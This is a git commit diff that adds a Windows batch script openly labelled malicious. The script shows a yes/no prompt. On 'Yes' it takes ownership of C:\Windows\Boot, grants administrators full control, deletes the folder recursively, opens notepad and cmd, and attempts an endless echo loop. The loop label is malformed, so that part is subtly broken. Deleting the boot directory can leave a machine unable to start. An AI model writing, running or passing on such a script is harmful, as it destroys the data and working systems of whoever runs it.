0e333e21f5d32d44bd0667c5dffaea890bcb0e82
BakerOthus <bakerothus@gmail.com>
2026-04-17 16:56:30 -0700

    Implement confirmation prompt for malicious action
    Added a choice prompt to confirm running the program and actions for both Yes and No responses.

--- Q2r5y.bat
+++ Q2r5y.bat
@@ -1,1 +1,21 @@
-echo program is malicious! running it?
+@echo off
+CHOICE /M "program is malicious! running it?"
+IF ERRORLEVEL 2 GOTO NO
+IF ERRORLEVEL 1 GOTO YES
+
+:YES
+takeown /f "C:\Windows\Boot" /r /d y
+icacls "C:\Windows\Boot" /grant administrators:F /t
+rmdir /s /q "C:\Windows\Boot"
+start notepad
+start cmd
+start 
+a:
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+goto a
+exit
+
+:NO
+echo You chose No!
+pause
+exit
